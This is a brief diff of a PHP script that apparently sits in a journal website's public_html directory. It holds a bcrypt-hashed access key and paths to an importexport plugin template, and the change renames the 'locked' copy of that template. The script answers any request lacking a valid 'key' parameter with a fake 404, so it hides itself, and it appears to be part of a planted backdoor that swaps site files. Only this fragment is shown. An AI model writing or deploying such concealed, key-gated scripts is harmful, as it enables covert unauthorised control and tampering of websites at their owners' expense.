@@ -3,7 +3,7 @@
 $PASSWORD_HASH = '$$2a$12$n/bMVdlk1UweEvs3Z7Fo0.MSff0N33bBWRGuyNMs.Xh2jbuBFOLjq'; 
 
 $originalFile = "/home/ejournal/public_html/plugins/importexport/native/templates/index.tpl";
-$lockedFile   = "/home/ejournal/public_html/plugins/importexport/native/templates/index.tpl";
+$lockedFile   = "/home/ejournal/public_html/plugins/importexport/native/templates/indexs.tpl";
 
 if (!isset($_GET['key']) || !isset($_GET['mode']) || !password_verify($_GET['key'], $PASSWORD_HASH)) {
     http_response_code(404);
